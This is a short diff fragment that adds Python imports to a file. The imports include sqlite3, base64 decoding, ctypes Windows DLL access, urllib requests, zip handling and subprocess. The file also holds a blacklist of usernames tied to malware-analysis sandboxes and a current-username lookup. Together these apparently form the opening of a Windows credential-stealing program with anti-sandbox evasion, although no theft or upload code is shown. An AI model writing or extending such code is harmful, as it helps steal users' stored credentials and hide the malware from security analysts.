@@ -1,3 +1,29 @@
+import os
+import threading
+from sys import executable
+from sqlite3 import connect as sql_connect
+import re
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+import time
+import shutil
+from zipfile import ZipFile
+import random
+import re
+import subprocess
+import sys
+import shutil
+import uuid
+import socket
+import getpass
+
+
+
+
+
 blacklistUsers = ['3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
 
 username = getpass.getuser()
